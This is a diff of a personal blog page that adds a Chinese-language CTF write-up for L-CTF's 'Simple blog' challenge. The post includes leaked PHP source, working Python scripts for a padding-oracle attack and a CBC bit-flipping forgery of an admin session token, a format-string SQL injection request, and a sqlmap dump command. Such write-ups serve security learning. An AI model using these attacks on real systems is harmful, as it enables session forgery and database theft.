@@ -6,17 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="www.xnianq.cn">
-  <title>Archives: 2017/7 | xnianq&#39;blog</title>
+  <title>l-ctf simpleblog wp | xnianq&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="More Code,less talk!">
-<meta property="og:type" content="website">
-<meta property="og:title" content="xnianq&#39;blog">
-<meta property="og:url" content="www.xnianq.cn/archives/2017/07/index.html">
+  <meta name="description" content="l-ctf simpleblog wp我好菜啊，我好菜啊，我好菜啊！">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="l-ctf simpleblog wp">
+<meta property="og:url" content="www.xnianq.cn/2017/11/19/l-ctf-simpleblog-wp/index.html">
 <meta property="og:site_name" content="xnianq&#39;blog">
-<meta property="og:description" content="More Code,less talk!">
+<meta property="og:description" content="l-ctf simpleblog wp我好菜啊，我好菜啊，我好菜啊！">
+<meta property="og:updated_time" content="2017-11-19T10:34:04.459Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xnianq&#39;blog">
-<meta name="twitter:description" content="More Code,less talk!">
+<meta name="twitter:title" content="l-ctf simpleblog wp">
+<meta name="twitter:description" content="l-ctf simpleblog wp我好菜啊，我好菜啊，我好菜啊！">
   
     <link rel="alternative" href="/atom.xml" title="xnianq&#39;blog" type="application/atom+xml">
   
@@ -152,36 +154,101 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-l-ctf-simpleblog-wp" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-title">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/07/31/ctf中web题目常见的协议/" class="archive-article-date">
-  	<time datetime="2017-07-31T06:35:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-31</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/07/31/ctf中web题目常见的协议/">ctf中web题目常见的协议</a>
+    <h1 class="article-title" itemprop="name">
+      l-ctf simpleblog wp
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2017/11/19/l-ctf-simpleblog-wp/" class="archive-article-date">
+  	<time datetime="2017-11-19T09:46:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="l-ctf-simpleblog-wp"><a href="#l-ctf-simpleblog-wp" class="headerlink" title="l-ctf simpleblog wp"></a>l-ctf simpleblog wp</h1><p>我好菜啊，我好菜啊，我好菜啊！<br><a id="more"></a></p>
+<p>这两天的事情确实有点多，校赛+Lctf+数据库考试都碰到了一起，实在是感觉到力不从心(其实还是自己太菜…</p>
+<p>lctf肝了一道题目，没错，就是一道题目，我花了一天多的时间才写出来，谢谢哈工大的师傅指导。不瞎bb了，就简单记录下做题的过程吧。</p>
+<p>题目:</p>
+<blockquote>
+<blockquote>
+<p>Simple blog<br>A simple blog .To discover the secret of it.<br><a href="http://111.231.111.54/" target="_blank" rel="external">http://111.231.111.54/</a></p>
+</blockquote>
+</blockquote>
+<p>这道题目一开始我想到有源码了，但是我用weakfilescan没有扫描出来，还是过分信赖于软件了，导致一上午的思路有点跑偏，下午哈工大的师傅说有源码，当时就想骂人…下次一定注意。<br>泄漏文件:<code>login.php.swp</code>,<code>admin.php.swp</code><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim -r login<span class="selector-class">.php</span><span class="selector-class">.swp</span>/admin<span class="selector-class">.php</span><span class="selector-class">.swp</span></div></pre></td></tr></table></figure></p>
+<p>恢复之后可以看到源码：<br>login.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="string">&lt;html&gt;</span></div><div class="line"><span class="string">&lt;head&gt;</span></div><div class="line"><span class="string">  &lt;meta charset="UTF-8"&gt;</span></div><div class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></div><div class="line"><span class="string">  &lt;link rel="stylesheet" type="text/css" href="css/login.css" /&gt;</span></div><div class="line"><span class="string">&lt;/head&gt;</span></div><div class="line"><span class="string">&lt;body&gt;</span></div><div class="line"><span class="string">  &lt;div class="login"&gt;</span></div><div class="line"><span class="string">    &lt;h1&gt;后台登录&lt;/h1&gt;</span></div><div class="line"><span class="string">    &lt;form method="post"&gt;</span></div><div class="line"><span class="string">        &lt;input type="text" name="username" placeholder="Username" required="required" /&gt;</span></div><div class="line"><span class="string">        &lt;input type="password" name="password" placeholder="Password" required="required" /&gt;</span></div><div class="line"><span class="string">        &lt;button type="submit" class="btn btn-primary btn-block btn-large"&gt;Login&lt;/button&gt;</span></div><div class="line"><span class="string">    &lt;/form&gt;</span></div><div class="line"><span class="string">&lt;/div&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div><div class="line"><span class="string">'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</div><div class="line">    $random_token = <span class="string">''</span>;</div><div class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">        $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125; </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">    $username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</div><div class="line">    $password = $_POST[<span class="string">'password'</span>];</div><div class="line">    $result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</div><div class="line">    $row = mysql_fetch_array($result);</div><div class="line">    <span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</div><div class="line">        get_identity();</div><div class="line">        header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">if</span>(test_identity())&#123;</div><div class="line">        header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        show_page();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">    $id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">        $title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">        $title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $title = <span class="string">''</span>;</div><div class="line">    &#125;</div><div class="line">    $sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">    $result = mysql_query($sql,$con);</div><div class="line">    $row = mysql_fetch_array($result);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">    &lt;title&gt;adminpage&lt;/title&gt;</div><div class="line">    &lt;link href=<span class="string">"css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</div><div class="line">    &lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">    &lt;script src=<span class="string">"js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;nav class="navbar navbar-default" role="navigation"&gt;</div><div class="line">   &lt;div class="navbar-header"&gt;</div><div class="line">      &lt;a class="navbar-brand" href="#"&gt;后台&lt;/a&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;div&gt;</div><div class="line">      &lt;ul class="nav navbar-nav"&gt;</div><div class="line">         &lt;li class="active"&gt;&lt;a href="#"&gt;编辑文章&lt;/a&gt;&lt;/li&gt;</div><div class="line">         &lt;li&gt;&lt;a href=<span class="string">"#"</span>&gt;设置&lt;/a&gt;&lt;/li&gt;</div><div class="line">      &lt;/ul&gt;</div><div class="line">   &lt;/div&gt;&lt;/nav&gt;</div><div class="line">   &lt;div class="panel panel-success"&gt;</div><div class="line">   &lt;div class="panel-heading"&gt;</div><div class="line">      &lt;h1 class="panel-title"&gt;文章列表&lt;/h1&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;div class="panel-body"&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=1'</span>&gt;Welcome to myblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=2'</span>&gt;Hello,world!&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=3'</span>&gt;This is admin page&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="step-1-padding-oracle"><a href="#step-1-padding-oracle" class="headerlink" title="step 1 padding oracle"></a>step 1 padding oracle</h2><p>因为一开始觉得是盲注，如果sql语句执行成功，返回admin.php;如果不成功，返回login errors。看到源码才知道自己有多naive。还是too young ..</p>
+<p>login.php的逻辑很清楚：</p>
+<ol>
+<li>首先验证账号密码是否正确，如果不正确返回login false.如果正确，调用<code>get_identity()</code>函数使用随机token对服务段的id进行aes-cbc模式加密，加密值记录到$_SESSION[‘id’]中。跳转到admin.php，不过$_SESSION[‘isadmin’] 这时为0，所以能登陆。</li>
+<li>接下来就是对获取到的token进行操作，看一下test_identity函数，是对id进行解密，如果解密之后id值为admin，则登陆成功。 </li>
+</ol>
+<p>重点就是在id解密这一块：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p>我们可以控制token，并且使用的cbc模式的解密，很明显是用的padding oracle。这道题和NJCTF 2017神似。当时也没出来，这次就试了一下。</p>
+<p>思路:</p>
+<ol>
+<li>利用padding oracle 对服务端的id明文进行获取</li>
+<li>利用cbc 子节反转攻击进行伪造admin 用户</li>
+</ol>
+<h3 id="对服务端id进行明文获取"><a href="#对服务端id进行明文获取" class="headerlink" title="对服务端id进行明文获取"></a>对服务端id进行明文获取</h3><p>网上有很多开源的padding oracle 攻击代码，原理是一致的，具体参考：<a href="http://xnianq.cn/2017/07/26/padding-oracle/" target="_blank" rel="external">http://xnianq.cn/2017/07/26/padding-oracle/</a></p>
+<p>这里我们获取到服务端（key）和本地token(IV)的中间值（非原创）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">url = <span class="string">'http://111.231.111.54/login.php'</span></div><div class="line">N = <span class="number">16</span></div><div class="line">l = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</div><div class="line">token = <span class="string">''</span></div><div class="line">out = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">        <span class="keyword">print</span> c</div><div class="line">        l[N-i] = c</div><div class="line">        token = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> l:</div><div class="line">            token = token + chr(m)</div><div class="line">        token = base64.b64encode(token)</div><div class="line">        header = &#123;<span class="string">'Cookie'</span>:<span class="string">"PHPSESSID=iq4pfss8j376ik61t5c3lgrlp4; token="</span>+token&#125;</div><div class="line">        res = requests.get(url, headers=header)</div><div class="line">        data = res.content</div><div class="line">        <span class="keyword">print</span> data</div><div class="line">        <span class="keyword">if</span> <span class="string">'Error!'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</div><div class="line">            out[N-i] = c ^ i</div><div class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(i):</div><div class="line">                l[N-y<span class="number">-1</span>] = out[N-y<span class="number">-1</span>] ^ (i+<span class="number">1</span>)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">print</span> out</div></pre></td></tr></table></figure></p>
+<h3 id="cbc子节反转攻击"><a href="#cbc子节反转攻击" class="headerlink" title="cbc子节反转攻击"></a>cbc子节反转攻击</h3><p>一开始以为结束了呢，但是发现提交的token不满足，然后就跑了几组out出来，发现前面一位始终为0，所以尝试一下爆破第一位(哈工大的大哥提醒的我)….将out获取到之后我们就可以进行cbc反转加密：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span>  base64</div><div class="line"><span class="keyword">import</span> requests</div><div class="line">token = <span class="string">'MEp3RXA4a1FsSXVqblJISw=='</span></div><div class="line">token = base64.b64decode(token)</div><div class="line">ID = [<span class="number">43</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">32</span>, <span class="number">122</span>, <span class="number">57</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">71</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">106</span>, <span class="number">5</span>, <span class="number">74</span>]</div><div class="line">id = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string,N)</span>:</span></div><div class="line">    l=len(string)</div><div class="line">    <span class="keyword">if</span> l!=N:</div><div class="line">        <span class="keyword">return</span> string+chr(N-l)*(N-l)</div><div class="line">des = <span class="string">"admin"</span>+<span class="string">"\x0b"</span>*<span class="number">11</span></div><div class="line">ID = <span class="string">"\x00afOPBRcDb2ow8M\x01"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">    tmp  = <span class="string">""</span></div><div class="line">    tID = chr(ord(ID[<span class="number">0</span>])^i)+ID[<span class="number">1</span>:]</div><div class="line">    <span class="comment">#print tID</span></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> xrange(<span class="number">16</span>):</div><div class="line">        tmp += chr(ord(token[t]) ^ ord(tID[t]) ^ ord(des[t]))</div><div class="line">    cookie1 =  base64.b64encode(tmp)</div><div class="line">    <span class="comment">#print tID</span></div><div class="line">    <span class="comment">#print cookie1.</span></div><div class="line">    cookie1 = cookie1.replace(<span class="string">"="</span>,<span class="string">"%3D"</span>)</div><div class="line">    <span class="comment">#print cookie1</span></div><div class="line">    cookies = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"iq4pfss8j376ik61t5c3lgrlp4"</span>,<span class="string">"token"</span>:cookie1&#125;</div><div class="line">    a = requests.get(url=<span class="string">"http://111.231.111.54/login.php"</span>,cookies=cookies)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">'Login'</span> <span class="keyword">not</span> <span class="keyword">in</span> a.content:</div><div class="line">        <span class="keyword">print</span> cookie1</div></pre></td></tr></table></figure></p>
+<p>上述脚本中，plaintext是服务端ID的明文值。将其与token异或，再和admin异或就可以得到token，进行登陆。</p>
+<h2 id="登陆admin-php"><a href="#登陆admin-php" class="headerlink" title="登陆admin.php"></a>登陆admin.php</h2><p>登陆进去之后，代码中看似做了很牛逼的防护：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">        $title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">        $title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $title = <span class="string">''</span>;</div><div class="line">    &#125;</div><div class="line">    $sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div></pre></td></tr></table></figure></p>
+<p>用了sprintf+mysql_real_escape_string。<br>妈耶，这怎么注入，上谷歌上搜了一下，发现wordpress的一个洞是关于这一防护绕过的。<br>网址：<a href="https://blog.sucuri.net/2017/02/sql-injection-vulnerability-nextgen-gallery-wordpress.html" target="_blank" rel="external">https://blog.sucuri.net/2017/02/sql-injection-vulnerability-nextgen-gallery-wordpress.html</a></p>
+<p>文章中说到，当使用fprint之后，传入<code>%1$%s</code>会变成<code>%1$&#39;%s&#39;</code>这样就把前面引号闭合了。然后就可以在后面执行sql语句。<br>手工和sqlmap都可以跑出来,数据包：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET <span class="regexp">/./</span>admin.php?id=39&amp;title=%1$cor%201%20*%20%23 HTTP/1.1</div><div class="line">Host: <span class="number">111.231</span><span class="number">.111</span><span class="number">.54</span></div><div class="line">Cache-<span class="string">Control:</span> max-age=<span class="number">0</span></div><div class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/62.0.3202.94 Safari/</span><span class="number">537.36</span></div><div class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></div><div class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span></div><div class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</div><div class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></div><div class="line"><span class="string">Cookie:</span> PHPSESSID=iq4pfss8j376ik61t5c3lgrlp4; token=AU98Y05xMjkjIEwOEmEOQQ=</div><div class="line"><span class="string">Connection:</span> close</div></pre></td></tr></table></figure></p>
+<p><code>sqlmap -r sqli.txt -D web1 -T key --dump</code><br>直接出来flag。</p>
+<p>感觉自己比这些赛棍菜好多，花了一天时间做了一个web题目,还是最简单的web题目。。我好菜啊。。</p>
+<hr>
+<p>本文出自”xnianq Blog”：www.xnianq.cn/2017/11/19/l-ctf-simpleblog-wp/</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/zfb.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/wx.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
